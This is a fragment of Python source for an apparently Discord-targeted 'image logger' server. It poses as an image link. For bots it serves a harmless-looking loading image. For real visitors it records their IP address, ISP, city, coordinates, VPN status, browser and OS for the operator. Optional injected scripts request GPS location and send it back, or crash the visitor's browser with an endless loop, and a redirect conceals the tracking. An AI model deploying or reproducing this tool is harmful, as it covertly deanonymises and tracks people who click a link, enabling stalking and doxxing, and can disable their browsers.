    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
